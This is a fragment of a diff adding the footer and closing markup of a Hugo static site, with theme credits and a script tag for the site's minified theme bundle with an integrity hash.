+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
